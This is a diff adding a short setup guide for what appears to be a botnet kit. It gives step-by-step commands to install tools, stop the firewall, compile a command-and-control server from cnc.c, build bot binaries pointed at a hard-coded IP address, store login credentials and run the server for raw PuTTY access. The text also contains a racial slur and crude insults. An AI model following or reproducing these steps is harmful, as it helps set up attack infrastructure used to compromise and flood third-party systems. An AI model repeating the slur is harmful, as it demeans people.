@@ -1,0 +1,21 @@
+Edit the bot.c file	AND CHANGE THE IP YOU SKANK WANK						 
+
+yum install python-paramiko nano screen gcc perl wget lbzip unzip -y
+
+service httpd restart 
+service iptables stop
+
+gcc cnc.c -o server -pthread
+
+python compile.py bot.c 185.132.53.11
+
+nano User_Info.txt         [Username password] [MUST BE NEXT TO EACH OTHER NIGGA]
+
+screen ./server 839 1 105                      [420 Will Be The Port For The Net]
+
+
+NOW PRESS CRTL A+D
+
+LOGIN WITH PUTTY RAW PORT = 420
+
+Love, @11xrvt & @kaitenqbot
